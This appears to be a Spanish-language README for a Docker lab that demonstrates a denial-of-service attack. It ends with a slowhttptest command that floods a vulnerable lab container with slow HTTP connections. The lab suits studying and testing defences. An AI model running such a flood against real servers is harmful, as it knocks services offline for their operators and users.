# Laboratorio de ataque DOS

## Uso

1. clonar el repositorio.
2. crea una copia del archivo *".example.env.prod"* llamada .env.prod y completalo con datos validos.
3. levantar la aplicación.

   ```bash
   docker compose --env-file .env.prod up
   ```
4. Accede a la consola del contendor a atacar.

   ```bash
   docker exec -it attacked-vuln sh
   ```
5. Ejecuta el monitor de pm2.

   ```bash
   pm2 monit
   ```
6. Accede a la consola del contendor atacante.

   ```bash
   docker exec -it attacker /bin/bash
   ```
7. Ejecuta el ataque.

   ```bash
   slowhttptest -c 100 -H -g -o slowhttp -i 3 -r 100 -t GET -u http://attacked-vuln:3004 -x 50 -p 3
   ```
